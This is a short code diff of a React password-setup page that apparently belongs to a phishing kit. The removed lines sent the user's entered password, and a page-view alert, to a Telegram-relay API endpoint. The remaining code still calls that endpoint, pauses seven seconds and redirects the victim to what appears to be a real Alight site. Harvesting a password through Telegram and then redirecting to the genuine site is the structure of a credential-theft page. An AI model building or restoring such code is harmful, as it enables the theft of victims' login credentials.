@@ -18,15 +18,6 @@ export default function NewUserPasswordPage() {
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const router = useRouter();
-  const viewNotificationSent = useRef(false);
-
-  useEffect(() => {
-    if (viewNotificationSent.current) return;
-    viewNotificationSent.current = true;
-    fetch("/api/telegram/new-user-password-view", { method: "POST" }).catch(
-      console.error,
-    );
-  }, []);
 
   const passwordsMatch = password === confirmPassword;
   const isFormValid =
@@ -45,10 +36,10 @@ export default function NewUserPasswordPage() {
       await fetch("/api/telegram/new-user-password", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ password }),
+        body: JSON.stringify({}),
       }).catch(console.error);
     } catch (err) {
-      console.error("Failed to send new user password notification:", err);
+      console.error("New user password error:", err);
     }
     await new Promise((r) => setTimeout(r, 7000));
     window.location.href = ALIGHT_REDIRECT_URL;
